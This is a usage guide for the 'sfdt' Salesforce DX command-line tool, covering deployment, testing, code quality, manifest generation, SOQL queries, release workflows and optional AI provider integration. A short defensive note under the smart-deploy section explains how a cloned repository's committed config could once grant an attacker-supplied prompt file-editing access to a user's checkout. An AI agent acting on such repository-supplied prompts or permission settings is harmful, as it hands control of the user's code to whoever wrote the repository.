# SFDT Usage Guide

This guide covers every sfdt command in depth: what it does, when to use it, all available options, and practical examples. It assumes you have already installed sfdt and run `sfdt init`. If not, start with the [Quick Start in README.md](../README.md#quick-start).

---

## Table of Contents

1. [How sfdt works](#how-sfdt-works)
2. [First-time setup: `sfdt init`](#first-time-setup-sfdt-init)
3. [AI features](#ai-features)
4. [Core deployment workflow](#core-deployment-workflow)
5. [Commands: Deployment](#commands-deployment)
   - [sfdt deploy](#sfdt-deploy)
   - [sfdt preflight](#sfdt-preflight)
   - [sfdt rollback](#sfdt-rollback)
   - [sfdt smoke](#sfdt-smoke)
6. [Commands: Testing and Quality](#commands-testing-and-quality)
   - [sfdt test](#sfdt-test)
   - [sfdt agent-test](#sfdt-agent-test)
   - [sfdt apex](#sfdt-apex)
   - [sfdt quality](#sfdt-quality)
7. [Commands: Metadata and Source Control](#commands-metadata-and-source-control)
   - [sfdt manifest](#sfdt-manifest)
   - [sfdt pull](#sfdt-pull)
   - [sfdt drift](#sfdt-drift)
   - [sfdt compare](#sfdt-compare)
   - [sfdt soql](#sfdt-soql)
8. [Commands: Release Management](#commands-release-management)
   - [sfdt release](#sfdt-release)
   - [sfdt changelog](#sfdt-changelog)
9. [Commands: AI Intelligence](#commands-ai-intelligence)
   - [sfdt explain](#sfdt-explain)
   - [sfdt review](#sfdt-review)
   - [sfdt pr-description](#sfdt-pr-description)
   - [sfdt ai](#sfdt-ai)
10. [Commands: Operations](#commands-operations)
    - [sfdt config](#sfdt-config)
    - [sfdt notify](#sfdt-notify)
    - [sfdt ui](#sfdt-ui)
11. [Commands: Org Health & Operations](#commands-org-health--operations)
    - [sfdt audit](#sfdt-audit)
    - [sfdt monitor](#sfdt-monitor)
    - [sfdt dependencies](#sfdt-dependencies)
    - [sfdt coverage](#sfdt-coverage)
    - [sfdt docs](#sfdt-docs)
    - [sfdt data](#sfdt-data)
    - [sfdt scratch](#sfdt-scratch)
12. [Commands: CI/CD & Release Automation](#commands-cicd--release-automation)
    - [sfdt ci init](#sfdt-ci-init)
    - [sfdt pr comment](#sfdt-pr-comment)
    - [sfdt retrofit](#sfdt-retrofit)
13. [Web Dashboard](#web-dashboard)
14. [Drift vs Compare: choosing the right tool](#drift-vs-compare-choosing-the-right-tool)
15. [Common workflows](#common-workflows)
16. [CI/CD integration](#cicd-integration)

---

## How sfdt works

sfdt is a Node.js CLI that wraps a set of shell scripts which drive the Salesforce CLI (`sf`). Configuration lives in a `.sfdt/` directory at your project root. Every command reads this configuration and exposes it to shell scripts via `SFDT_*` environment variables.

sfdt requires **no project-specific hardcoding** — the same tool works across any Salesforce DX project by reading `.sfdt/config.json`.

---

## First-time setup: `sfdt init`

Run `sfdt init` once from your Salesforce DX project root. It walks you through an interactive setup and creates the `.sfdt/` configuration directory.

```bash
cd my-sf-project
sfdt init
```

**What it asks:**

| Prompt | Description |
|---|---|
| Project name | Display name used in logs and notifications |
| Default org alias | The `sf`-authenticated org alias to use by default |
| Code coverage threshold | Minimum Apex test coverage percentage (default: 75) |
| Enable AI features | Whether to enable AI-powered commands |
| AI provider | `claude`, `gemini`, or `openai` (if AI is enabled) |
| Release notes directory | Where AI-generated release notes are written (default: `release-notes/`) |

**What it creates:**

```
.sfdt/
  config.json          # Core settings: org, AI provider, coverage threshold, feature flags
  environments.json    # Named environments and org aliases
  pull-config.json     # Metadata types to pull from org
  test-config.json     # Test classes, coverage threshold, test level
```

`sfdt init` also scans your `packageDirectories` for Apex test classes (`*Test.cls`) and production classes to populate `test-config.json` automatically.

**After init:** Add `.sfdt/*.local.json` to your `.gitignore` to avoid committing environment-specific
overrides, and `.sfdt/prompts.json` so your AI prompt overrides do not travel to whoever clones the repo.

---

## AI features

sfdt has optional AI integration that powers several commands: `test` (failure analysis), `quality` (fix plans), `manifest` (dependency cleanup), `explain` (log analysis), `review` (code review), `pr-description`, `release` (release notes), and `changelog generate`.

All AI commands degrade gracefully when AI is disabled or unavailable — heuristic fallbacks run where applicable, and other commands simply skip the AI step.

### Enabling AI

Set in `.sfdt/config.json`:

```json
{
  "features": { "ai": true },
  "ai": { "provider": "claude" }
}
```

### Provider: Claude

Requires the [Claude Code CLI](https://www.npmjs.com/package/@anthropic-ai/claude-code):

```bash
npm install -g @anthropic-ai/claude-code
```

Claude runs interactively — it can read your repository files directly using tools (`Read`, `Grep`, `Glob`, `Bash`). This gives it full project context for code review, failure analysis, and manifest cleanup.

No API key is needed in sfdt config. Claude Code handles its own authentication.

### Provider: Gemini

Requires the Gemini CLI:

```bash
npm install -g @google/gemini-cli
```

Configure:

```json
{
  "ai": { "provider": "gemini", "model": "" }
}
```

Authentication and model selection are handled by the Gemini CLI.

### Provider: OpenAI

Requires the Codex CLI:

```bash
npm install -g @openai/codex
```

```json
{
  "ai": { "provider": "openai", "model": "" }
}
```

Authentication and model selection are handled by the Codex CLI.

### Disabling AI

```json
{ "features": { "ai": false } }
```

All AI steps are skipped. Commands that are AI-only (like `review` and `pr-description`) exit with an error explaining how to enable it.

---

## Core deployment workflow

The standard sfdt deployment cycle is:

```
sfdt preflight          # validate the branch is ready
sfdt test               # run Apex tests
sfdt manifest           # generate package.xml from git diff
sfdt deploy             # deploy to target org
sfdt smoke              # post-deploy verification
sfdt changelog generate # update CHANGELOG.md
sfdt notify deploy-success
```

`sfdt deploy` automatically runs preflight before deploying unless `--skip-preflight` is passed.

---

## Commands: Deployment

### sfdt deploy

Deploys metadata to a Salesforce org using the configured deployment script. By default, preflight runs automatically before the deploy starts.

```bash
sfdt deploy
sfdt deploy --managed
sfdt deploy --skip-preflight
sfdt deploy --source-dir force-app/feature-a   # deploy a folder directly (no manifest)
```

**Options:**

| Option | Description |
|---|---|
| `--managed` | Use `deploy-manager.sh` instead of `deployment-assistant.sh` for managed package deployments |
| `--skip-preflight` | Skip the preflight validation step and go straight to deployment |
| `--dry-run` | Show what would be executed without making changes |
| `--source-dir <path>` | Deploy a source directory directly instead of a manifest (relative to project root). Bypasses manifest selection and deploys the folder with `sf project deploy start --source-dir`. |
| `--tag` | Tag the release in git (`v<version>`) after a successful deploy. In an interactive terminal this pre-selects "tag after deployment" (skipping the prompt); in non-interactive/CI runs the tag is created and pushed automatically. Standard manifest deploy only — ignored (with a warning) under `--smart`, `--managed`, and `--source-dir`. |
| `--create-pr` | Create a pull request from the current branch to the default branch (`defaultBranch` config, default `main`) via the `gh` CLI after a successful deploy. Works in interactive and non-interactive runs. Standard manifest deploy only — ignored (with a warning) under `--smart`, `--managed`, and `--source-dir`. |
| `--notify` | Send the deploy success/failure notification through `sfdt notify`. Works in interactive and non-interactive runs. Standard manifest deploy only — ignored (with a warning) under `--smart`, `--managed`, and `--source-dir`. |

**What happens:**

1. Preflight runs (`new/preflight.sh`) unless `--skip-preflight` is set. If preflight fails, the deploy is aborted.
2. The deployment script runs (`core/deployment-assistant.sh` or `core/deploy-manager.sh`). The interactive picker offers any `.xml` manifest found in your manifest directory (`manifestDir`, default `manifest/release/`) — generated `rl-*-package.xml` releases are listed first, but plain `package.xml` files and `preview-package.xml` work too. Companion `*-destructiveChanges.xml` files and the `deploy/`/`deployed/` subfolders are excluded.
3. Output is streamed directly to your terminal with full TTY passthrough (spinner, colors, interactive prompts from the script).

Use `--managed` when deploying a second-generation managed package where the deploy-manager script handles namespace and version locking.

Use `--source-dir` for targeted deploys of a single package directory without generating a manifest first — useful during development or when you want to deploy exactly what's in a folder.

#### sfdt deploy --smart

Smart delta deploy. `sfdt deploy --smart` computes a git delta (reusing the same manifest engine as `sfdt manifest`), applies `package-no-overwrite.xml` protection, auto-selects the minimal safe test level (`NoTestRun` / `RunSpecifiedTests` / `RunLocalTests` — never downgraded in production), and runs a self-contained, non-interactive `sf project deploy validate|start`. When `RunSpecifiedTests` is chosen, the selection is widened by the Spring '26 `@IsTest` annotations: test classes whose `@IsTest(testFor='Type:Name')` targets a changed component, and every `@IsTest(critical=true)` class, are included automatically (sources are comment/string-sanitized before scanning, so commented-out annotations don't count). Unlike the interactive deploy path, it has no archive/commit side effects.

```bash
sfdt deploy --smart                              # validate the delta against the default org
sfdt deploy --smart --prod                       # deploy to production (forces RunLocalTests minimum)
sfdt deploy --smart --delta-base origin/main --delta-head HEAD
sfdt deploy --smart --pr-comment                 # decorate the current PR with the delta + outcome
sfdt deploy --smart --ai-fix                     # analyse failures with the editable deploy-error prompt
```

**Options:**

| Option | Description |
|---|---|
| `--smart` | Compute a git delta and run a self-contained validate/deploy |
| `--delta-base <ref>` | Git ref to diff from (the base of the delta) |
| `--delta-head <ref>` | Git ref to diff to (the head of the delta) |
| `--prod` | Treat the target as production: never downgrade the test level |
| `--pr-comment` | Decorate the current PR with the computed delta and the deploy outcome |
| `--ai-fix` | On failure, analyse the deploy errors via the editable `deploy-error` prompt |
| `--agent` | Run a non-interactive AI session for the deploy |

The bounded coding-agent auto-fix loop is **default-off**. It requires `SFDT_ALLOW_AI_WRITE=1` in your
environment (CLI providers only), and re-validates via a dry-run each turn — it never deploys.

> The grant used to be `ai.agent.enabled` + `ai.agent.allowWrite` in `.sfdt/config.json`. That file is
> committed, so a cloned repo could set both and hand its own prompt an `Edit` tool in your checkout —
> two booleans in a file the attacker controls are one gate, not two. Both keys are still accepted by the
> schema and now do nothing. See [ENV-VARS](./ENV-VARS.md).

---

### sfdt preflight

Runs pre-deployment validation checks without deploying. This is the same check that `sfdt deploy` runs automatically. Run it standalone when you want to validate before committing to a deployment.

```bash
sfdt preflight
sfdt preflight --strict
```

**Options:**

| Option | Description |
|---|---|
| `--strict` | Fail on any warning, not just errors |

**What it checks** (configured in `new/preflight.sh` and controlled by `.sfdt/config.json`):

- Branch naming conventions (warn or fail, depending on `preflight.enforceBranchNaming`)
- Apex test presence (warn or fail, depending on `preflight.enforceTests`)
- CHANGELOG.md has unreleased content (warn or fail, depending on `preflight.enforceChangelog`)

To make warnings into hard failures, set the enforcement flags in `.sfdt/config.json`:

```json
{
  "deployment": {
    "preflight": {
      "enforceTests": true,
      "enforceBranchNaming": true,
      "enforceChangelog": true
    }
  }
}
```

The preflight result is written to `logs/preflight-latest.json` and is visible in the web dashboard.

---

### sfdt rollback

Rolls back a deployment to a target org. By default, takes a backup of the org's current state before rolling back (configurable).

```bash
sfdt rollback
sfdt rollback --org staging
```

**Options:**

| Option | Description |
|---|---|
| `--org <alias>` | Target org alias (defaults to `config.defaultOrg`) |

**Backup behavior:** `deployment.backupBeforeRollback` in `.sfdt/config.json` controls whether the rollback script takes an org snapshot before rolling back. Default: `true`. Set to `false` to skip the backup.

---

### sfdt smoke

Runs post-deployment smoke tests against a target org to verify the deployment succeeded and core functionality is intact.

```bash
sfdt smoke
sfdt smoke --org production
```

**Options:**

| Option | Description |
|---|---|
| `--org <alias>` | Target org alias (defaults to `config.defaultOrg`) |

Smoke tests are defined in `scripts/new/smoke.sh`. This command is intended to be run immediately after a successful `sfdt deploy`.

---

## Commands: Testing and Quality

### sfdt test

Runs Apex tests against the configured org using the enhanced test runner. If tests fail and AI is enabled, sfdt offers to analyze the failures automatically.

```bash
sfdt test
sfdt test --analyze
sfdt test --legacy
sfdt test --logic                                   # Apex + Flow tests in one pass
sfdt test --logic --tests FooTest,FlowTesting.MyFlow --code-coverage
sfdt test --lwc                                      # local LWC (Jest) unit tests
```

**Options:**

| Option | Description |
|---|---|
| `--legacy` | Use `run-tests.sh` instead of the enhanced runner |
| `--analyze` | Run the test analyzer (`quality/test-analyzer.sh`) after tests complete, regardless of pass/fail |
| `--logic` | Run Apex **and** Flow tests together via `sf logic run test` (Salesforce Spring '26 beta). Requires the org **"View All Data"** permission. Waits for async results (`--wait`, default 30 min). |
| `--org <alias>` | Target org for `--logic` (default: `config.defaultOrg`) |
| `--test-level <level>` | For `--logic`: `RunLocalTests` \| `RunAllTestsInOrg` \| `RunSpecifiedTests` |
| `--tests <list>` | For `--logic`: comma-separated test names — Apex classes and Flow tests as `FlowTesting.<name>` |
| `--category <cat>` | For `--logic`: restrict to `Apex` or `Flow` |
| `--code-coverage` | For `--logic`: retrieve code coverage results |
| `--wait <minutes>` | For `--logic`: streaming wait timeout (default 30) |
| `--lwc` | Run the project's local LWC (Jest) unit tests. Detects a wired-up Jest runner (`@salesforce/sfdx-lwc-jest` dependency or a `test:unit` script) plus `__tests__` directories, then runs `npm run test:unit` or the `sfdx-lwc-jest` binary |

> `--logic` is a thin pass-through to `sf logic run test`. On failure (with `features.ai` enabled) sfdt offers the same AI failure analysis as the Apex runner, feeding it the captured logic-test output.

**AI behavior on failure:** If tests fail and `features.ai` is `true` and the configured AI provider is available, sfdt prompts:

```
Tests failed. Analyze failures with AI? (Y/n)
```

If you answer yes, the AI examines the test result output, identifies root causes, and suggests specific code fixes. It checks for: missing test data, SOQL governor limit violations, null pointer exceptions, and assertion failures.

Test results are written to `logs/test-results/` as JSON files and are visible in the web dashboard.

**Disabling the AI offer:** Set `features.ai: false` in config to skip the prompt entirely.

---

### sfdt quality

Runs static code quality analysis and optionally generates an AI fix plan. Can analyze code structure, test quality, or both.

```bash
sfdt quality                    # code analyzer + additive ApexGuru org-side check (default)
sfdt quality --api67            # API v67 (Summer '26) user-mode readiness scan only
sfdt quality --test-hints       # flag @IsTest classes lacking @IsTest(testFor=...) hints
sfdt quality --apexguru         # ApexGuru org-side analysis only
sfdt quality --tests            # test analyzer only
sfdt quality --all              # both analyzers (+ ApexGuru)
sfdt quality --skip-apexguru    # analyzer run without the org-side check
sfdt quality --fix-plan         # run analyzer + AI fix plan
sfdt quality --generate-stubs   # generate @IsTest stub classes for untested Apex
sfdt quality --generate-stubs --dry-run  # preview stubs without writing files
```

**Options:**

| Option | Description |
|---|---|
| `--tests` | Run `quality/test-analyzer.sh` only |
| `--all` | Run both `quality/code-analyzer.sh` and `quality/test-analyzer.sh` |
| `--apexguru` | Run **only** the ApexGuru org-side analysis check (honours `--json`) |
| `--skip-apexguru` | Skip the additive ApexGuru check during analyzer runs |
| `--org <alias>` | Target org for the ApexGuru check (default: `config.defaultOrg`) |
| `--fix-plan` | After analysis, send the output to AI for a prioritized, file-specific fix plan |
| `--include-fixes` | Ask **Code Analyzer v5** for actionable fixes/suggestions in the scan output (`--include-fixes --include-suggestions`); the richer output feeds `--fix-plan` |
| `--output-file <path>` | Also write the Code Analyzer v5 results to a file; the format follows the extension (e.g. `.sarif` for GitHub code-scanning upload) |
| `--generate-stubs` | Generate `@IsTest` stub classes for Apex classes that have no test class |
| `--dry-run` | Preview `--generate-stubs` output without writing any files |

**Code Analyzer engine:** `sfdt quality` runs **Salesforce Code Analyzer v5** (`sf code-analyzer run`, a just-in-time plugin that auto-installs on a modern `sf` CLI) — the only supported engine. If v5 is unavailable the scan is reported as **SKIPPED** (never a fabricated clean result). Install manually with `sf plugins install code-analyzer` if needed. Legacy Code Analyzer v4 support (and its `--allow-legacy-analyzer` opt-in) was removed at 1.0.

**ApexGuru org-side analysis:** alongside the local Code Analyzer v5 scan, `sfdt quality` submits your largest non-test Apex classes (up to 10) to **ApexGuru**, Salesforce's org-side performance/anti-pattern service, via the org REST API (`apexguru/validate` → `apexguru/request` → poll for the report). ApexGuru is **license/edition-gated** and must be enabled by an org admin, so the check follows the established gated-org-check policy: with no org, no license, or the feature disabled it degrades to **skipped** (loudly — never a fabricated pass), and an enabled-but-incomplete analysis degrades to **warn**. It never reports `error` and it is **advisory**: whatever ApexGuru returns, the `sfdt quality` exit code stays what the local analyzers alone would produce. Results print in the CLI, feed the `--fix-plan` context, and are persisted raw to `logs/apexguru-latest.json` (archived under `logs/apexguru-results/`, indexed in `sfdt history` as type `apexguru`).

**AI fix plan:** The fix plan groups issues by severity (critical, high, medium, low) and provides file locations, descriptions, and concrete code suggestions. It focuses on Salesforce-specific concerns: governor limits, CRUD/FLS enforcement, bulk-safe patterns, and test coverage gaps.


### sfdt agent-test

Runs an Agentforce agent test (`sf agent test run`) as a CI gate. By default pass/fail is taken from the CLI's exit code (the reliable signal, like `sf apex run test`), so it slots into any pipeline. With `--threshold` it instead grades on the aggregate pass rate, letting a run tolerate some failing cases. Optionally notifies configured channels and decorates the current PR.

```bash
sfdt agent-test --spec MyAgentEval
sfdt agent-test --spec MyAgentEval --org uat --wait 45
sfdt agent-test --spec MyAgentEval --threshold 80        # pass if >= 80% of cases pass
sfdt agent-test --spec MyAgentEval --notify --pr-comment
```

**Options:**

| Option | Description |
|---|---|
| `--spec <apiName>` | **Required.** Agent test API name (an `AiEvaluationDefinition`) to run |
| `--org <alias>` | Target org (default: `config.defaultOrg`) |
| `--wait <minutes>` | Wait timeout in minutes (default: 30; the underlying command is async and sfdt waits for the result) |
| `--threshold <percent>` | Pass when the aggregate pass rate is `>=` this percent (0-100), overriding the exit-code gate. Without it, any failed test case fails the run |
| `--notify` | Dispatch an `agent-test-success` / `agent-test-failure` notification through configured channels |
| `--pr-comment` | Post the pass/fail result to the current PR (via the `gh` CLI) |

The pass rate is computed from the `sf agent test run --json` result (both the legacy and Agentforce Studio result shapes), mirroring how the `sf` agent plugin itself counts passing cases: a case passes when every one of its scorer/test results passes.


### sfdt apex

Apex observability: manage debug **trace flags**, retrieve and **watch debug logs**, and execute **Anonymous Apex** — the debugging loop that complements `sfdt test` (which owns test execution). Debug logs go through the `sf apex` commands; trace flags use the Tooling API, since the `sf` CLI has no first-class trace-flag command. If the `sf apex` plugin is unavailable, commands fail with an actionable install hint (`sf plugins install @salesforce/plugin-apex`) rather than a fabricated result.

```bash
# Trace flags (mutating — they write TraceFlag records)
sfdt apex trace start                          # trace the authenticated user for 60 minutes
sfdt apex trace start --user u@x.com --duration 30
sfdt apex trace start --level SFDC_DevConsole  # use an existing DebugLevel
sfdt apex trace list                           # read-only
sfdt apex trace stop                           # delete the authenticated user's USER_DEBUG flags
sfdt apex trace stop --all                     # delete every USER_DEBUG flag in the org

# Debug logs (read-only)
sfdt apex logs list --limit 10
sfdt apex logs get 07L5g00000AbCdEEAV          # print the raw body
sfdt apex logs get 07L5g00000AbCdEEAV --output debug.log
sfdt apex logs watch                           # tail new logs for 5 minutes (CI-safe default)
sfdt apex logs watch --duration 0              # until interrupted (interactive)
sfdt apex logs watch --duration 60 --max 3 --no-body

# Anonymous Apex (mutating — the code runs in the org)
sfdt apex run --file scripts/apex/reset-flags.apex
echo 'System.debug(UserInfo.getUserName());' | sfdt apex run
```

**Options:**

| Option | Description |
|---|---|
| `--org <alias>` | Target org (default: `config.defaultOrg`); available on every subcommand |
| `--json` | Emit the structured JSON envelope on stdout; available on every subcommand |
| `trace start --user <username>` | Username to trace (default: the org's authenticated user) |
| `trace start --duration <minutes>` | Trace window in minutes (default 60, capped at 1440 = the Salesforce 24 h limit) |
| `trace start --level <developerName>` | DebugLevel DeveloperName. Default: the sfdt-managed `SFDT_Trace`, created on demand; any other missing name is an error — sfdt never silently invents a level you named |
| `trace stop --user <username>` / `--all` | Whose USER_DEBUG flags to delete (default: the authenticated user), or all of them |
| `logs list --limit <n>` / `--user <name>` | Cap the list (default 20) / only logs from one user |
| `logs get <logId> --output <file>` | Write the raw log body to a file (the file stays raw; the JSON envelope is stdout-only) |
| `logs watch --interval <seconds>` | Poll interval (default 5) |
| `logs watch --duration <seconds>` | Total watch window (default 300; `0` = until interrupted). Bounded by default so it is safe in CI |
| `logs watch --max <n>` / `--no-body` | Stop after n new logs / report metadata without fetching bodies |
| `run --file <path>` | Apex file to execute; without it, code is read from stdin (piped input) |

`apex run` reports the full compile/execution diagnostics (`compiled`, `compileProblem`, `exceptionMessage`, stack trace, and the debug log) and exits non-zero when the Apex failed — in `--json` mode the envelope still carries the diagnostics, so CI can branch on `result.success`.

Only logs generated *after* `apex logs watch` starts are streamed; pre-existing logs are skipped.

---

## Commands: Metadata and Source Control

### sfdt manifest

Generates a `package.xml` from a git diff. Understands Salesforce metadata file naming conventions to map changed files to their metadata types and member names. Optionally invokes AI to check the manifest for likely missing dependencies before you deploy.

```bash
sfdt manifest                                    # diff main...HEAD → manifest/release/preview-package.xml
sfdt manifest --base develop                     # diff from develop
sfdt manifest --base abc1234                     # diff from a specific commit SHA
sfdt manifest --name 1.2.0                       # named release → rl-1.2.0-package.xml
sfdt manifest --name sprint-q2                   # free-form name → rl-sprint-q2-package.xml
sfdt manifest --name today                       # date stamp → rl-2026-05-06-package.xml
sfdt manifest --package feature-a               # scope diff to one package directory
sfdt manifest --package feature-a --name 1.2.0  # scoped + named → rl-1.2.0-feature-a-package.xml
sfdt manifest --package all --name 1.2.0        # all packages → rl-1.2.0-package.xml
sfdt manifest --output deploy/pkg.xml            # custom output path
sfdt manifest --destructive dist/del.xml         # also write destructiveChanges.xml
sfdt manifest --print                            # print to stdout instead of writing a file
sfdt manifest --ai-cleanup                       # run AI dependency check on the manifest
sfdt manifest --no-ai-cleanup                    # skip AI check even when AI is enabled
```

**Options:**

| Option | Description |
|---|---|
| `--base <ref>` | Base git ref to diff from (default: `main`). Accepts branch names or commit SHAs. |
| `--head <ref>` | Head git ref to diff to (default: `HEAD`) |
| `--name <label>` | Release label for the output filename: semver (`1.2.0`), free-form (`sprint-q2`), or `today` (resolves to `YYYY-MM-DD`). Omit for a preview manifest. |
| `--version <label>` | Alias for `--name` (backward compatibility) |
| `--package <name\|all>` | Scope the git diff to a specific package directory (matched by the last path segment, e.g. `feature-a` for `force-app/feature-a`). Use `all` (the default) to span all package directories. |
| `--output <path>` | Output path for `package.xml`. Overrides the computed path. |
| `--destructive <path>` | Also write a `destructiveChanges.xml` for deleted components to this path |
| `--ai-cleanup` | Run AI dependency analysis on the generated manifest |
| `--no-ai-cleanup` | Skip AI dependency analysis even when `features.ai` is enabled |
| `--print` | Print `package.xml` to stdout instead of writing a file |

**Output filename convention:**

| Scenario | Output path |
|---|---|
| No `--name` | `manifest/release/preview-package.xml` |
| `--name 1.2.0` (all packages) | `manifest/release/rl-1.2.0-package.xml` |
| `--name 1.2.0 --package feature-a` | `manifest/release/rl-1.2.0-feature-a-package.xml` |
| With `manifestLayout: subpath` | `manifest/release/feature-a/rl-1.2.0-package.xml` |

**Merge-base resolution:** When `--base` is a branch name, sfdt automatically computes the merge-base between the base branch and HEAD. This prevents including commits already on the base branch in your manifest. To bypass this and diff from the branch tip directly, pass an explicit commit SHA.

**Multi-package projects:** If your `sfdx-project.json` has multiple `packageDirectories`, use `--package <name>` to scope the diff to one directory. The package name is the last segment of the directory path (e.g. `force-app/feature-a` → `feature-a`). Set `manifestLayout: subpath` in `.sfdt/config.json` to organize outputs into per-package subdirectories.

**AI dependency cleanup:** The AI reviews the manifest against the actual source files and flags likely missing dependencies (e.g. a new `CustomField` that's missing its parent `CustomObject`, or an `ApexClass` referenced in a `Flow` that's not included). It groups findings into MISSING, RISKY, and OK and concludes with a one-line verdict.

**Destructive changes:** If deleted files are detected in the diff, sfdt warns you. Rerun with `--destructive <path>` to emit the `destructiveChanges.xml` alongside the additive manifest.

---

### sfdt pull

Pulls metadata from the configured default org into your local source directory using a SQLite-backed cache for incremental retrieves. Only components that have changed in the org since the last pull are re-fetched, making subsequent pulls significantly faster.

```bash
sfdt pull             # incremental — only changed components
sfdt pull --full      # force full retrieve and rebuild cache
sfdt pull --status    # show cache status (last pull time, component counts)
sfdt pull --dry-run   # preview what would be retrieved without making changes
```

**Configuration (`pull-config.json`):**

```json
{
  "metadataTypes": [
    "ApexClass",
    "ApexTrigger",
    "LightningComponentBundle",
    "CustomObject",
    "CustomField",
    "Layout",
    "FlexiPage",
    "PermissionSet",
    "Flow"
  ],
  "targetDir": "force-app/main/default"
}
```

Cache behavior is controlled via `pullCache` in `.sfdt/config.json` (set during `sfdt init`):

```json
{
  "pullCache": {
    "enabled": true,
    "parallelism": 5,
    "batchSize": 100
  }
}
```

Add or remove metadata types to control what gets pulled. Run `sfdt pull` after changes are made directly in the org (e.g. by an admin) to bring your source directory in sync. Use `--full` to reset the cache and force a complete re-retrieve.

---

### sfdt drift

Detects metadata drift between your local source files and a target org. Drift occurs when changes are made directly in the org without being committed to source control. The result is written to `logs/drift-latest.json` and appears in the web dashboard.

```bash
sfdt drift
sfdt drift --org staging
```

**Options:**

| Option | Description |
|---|---|
| `--org <alias>` | Target org alias to check for drift (defaults to `config.defaultOrg`) |

Use drift detection as a pre-deployment sanity check to ensure no one has been making changes directly in the org that would be overwritten by your deployment.

**See also:** [Drift vs Compare](#drift-vs-compare-choosing-the-right-tool)

---

### sfdt compare

Compares the full metadata inventory between two orgs, or between local source and an org. Unlike `sfdt drift` (which checks for modified metadata within a component), `sfdt compare` checks for the presence or absence of entire metadata members across both sides.

```bash
sfdt compare                                  # local source vs default org
sfdt compare --target sandbox-uat            # local source vs a named sandbox
sfdt compare --source prod --target sandbox  # org-to-org comparison
sfdt compare --output deploy/missing.xml     # write source-only items as package.xml
```

**Options:**

| Option | Description |
|---|---|
| `--source <alias\|local>` | Source side of the comparison. Use `local` for your checked-out source, or an org alias (default: `local`) |
| `--target <alias>` | Target org alias to compare against (defaults to `config.defaultOrg`) |
| `--output <file>` | Write a `package.xml` containing only the source-only items (items in source but not in target) to this file |

**How it works:**

1. Fetches metadata inventory from the source (local glob or `sf org list metadata`) and target (`sf org list metadata`).
2. Diffs the two inventories, classifying each component as `source-only`, `target-only`, or `both`.
3. Writes the result to `logs/compare-latest.json`.
4. If `--output` is provided, generates a `package.xml` of source-only components — ready to use as a deployment manifest for promoting source to target.

**Output:** Results are visible in the web dashboard's Compare page, where you can filter by status and trigger an XML diff of individual components that exist in both sides.

**See also:** [Drift vs Compare](#drift-vs-compare-choosing-the-right-tool)

---

### sfdt soql

The SOQL/SOSL toolkit — the query and schema lifecycle in one command family: find sObjects, describe their fields and relationships, validate a query without running it, check the org's query plans, and finally execute it with a row bound enforced (never an unbounded dump). All subcommands are read-only against the org and support `--json`.

```bash
sfdt soql search invoice --category custom          # which objects match "invoice"?
sfdt soql describe Account --filter phone           # field inventory (filtered)
sfdt soql relationships Contact                     # parent lookups + child subqueries
sfdt soql validate "SELECT Id FROM Account"         # local checks + org LIMIT 0 round-trip
sfdt soql plan "SELECT Id FROM Case WHERE Status='Open'"   # REST explain: cost/selectivity
sfdt soql query "SELECT Id, Name FROM Account" --limit 50  # bounded execution
sfdt soql query "SELECT Id FROM Contact" --out contacts.csv # export raw rows (csv/json)
sfdt soql sosl "FIND {Acme} IN ALL FIELDS RETURNING Account(Id, Name)"
```

**Subcommands:**

| Subcommand | Description |
|---|---|
| `search [term]` | Find sObjects by case-insensitive name substring (`--category all\|custom\|standard`, `--limit <n>`) |
| `describe <sobject>` | Fields (type, picklists, references), key prefix, and child relationships (`--filter <term>`, `--tooling`) |
| `relationships <sobject>` | Parent lookups (dot notation) and child relationships (subqueries) (`--direction parent\|child\|both`) |
| `validate <query>` | Local static checks plus an org `LIMIT 0` round-trip; exits non-zero when invalid (`--local-only`, `--tooling`) |
| `plan <query>` | Org query plans via the REST explain endpoint — the query is never executed (`--api-version <ver>`) |
| `query <soql>` | Bounded SOQL execution (`--limit <n>`, `--tooling`, `--all-rows`, `--out <file>`, `--format json\|csv`) |
| `sosl <search>` | Bounded SOSL execution (`--limit <n>`, `--out <file>`, `--format json\|csv`) |

**Bounded execution:** `query`/`sosl` never run unbounded. The effective row cap is `--limit`, defaulting to `soql.defaultLimit` (200) and clamped to `soql.maxLimit` (2000) — both configurable in `.sfdt/config.json`. A `LIMIT` already in the query is kept only when it is at or under the cap; results carry `bound` and `truncated` metadata so CI consumers can tell a complete result from a capped one.

**Validation degrades gracefully:** with no reachable org, `validate` reports its local-only verdict with a warning — it never fabricates an org pass. `--out` exports write the **raw** records to disk (the `{status, result, warnings}` envelope exists on stdout only).

All read-only pieces are exposed to MCP as `sfdt_soql_search`, `sfdt_soql_describe`, `sfdt_soql_validate`, `sfdt_soql_plan`, and `sfdt_soql_query` (see [MCP.md](MCP.md)), and the family appears in the VS Code command tree as "SOQL Toolkit".

---

## Commands: Release Management

### sfdt release

Generates a versioned release manifest, optionally creates AI-powered release notes, and walks you through a git commit → tag → deploy → push workflow.

```bash
sfdt release 1.5.0
sfdt release        # version is read from config or prompted
```

**Arguments:**

| Argument | Description |
|---|---|
| `[version]` | Semver version string (e.g. `1.5.0`). If omitted, the release script resolves the version. |

**What happens:**

1. Runs `core/generate-release-manifest.sh`, which produces versioned manifest files in `manifest/release/` (e.g. `rl-1.5.0-package.xml`).
2. If AI is enabled, prompts: "Generate AI-powered release notes from git log?" If yes, the AI reads recent commits and writes structured release notes to `release-notes/rl-1.5.0-RELEASE-NOTES.md`.
3. Stages the manifest files, `CHANGELOG.md`, and release notes.
4. Prompts to commit the staged files with message `release: Generate manifests for 1.5.0`.
5. Prompts to create an annotated git tag (`v1.5.0`).
6. Prompts: "Proceed to deployment?" If yes, runs the deployment script.
7. Prompts to push the tag to origin.

Every step in the git workflow is optional — you can bail out at any confirm prompt.

---

### sfdt changelog

Manages changelog files. Three subcommands: `generate`, `release`, and `check`. All subcommands support an optional `--package <name>` flag to scope operations to a specific package directory's changelog (stored in `changelogs/<name>.md` by default). Without `--package`, all commands operate on the global `CHANGELOG.md`.

#### sfdt changelog generate

Uses AI to analyze recent git commits and generate `[Unreleased]` entries. Creates the file from a standard template if it does not exist.

```bash
sfdt changelog generate
sfdt changelog generate --limit 30
sfdt changelog generate --package marketing
```

**Options:**

| Option | Description |
|---|---|
| `--limit <n>` | Number of commits to analyze (default: 20) |
| `--package <name>` | Scope to a specific package directory; writes to `changelogs/<name>.md` |

The AI categorizes changes into Added, Changed, Fixed, Deprecated, Removed, and Security sections. After the AI produces the entries, sfdt asks whether to append them to the `[Unreleased]` section.

Requires `features.ai: true` and a configured provider.

---

#### sfdt changelog release

Moves the `[Unreleased]` section to a new versioned section with the current date.

```bash
sfdt changelog release 1.5.0
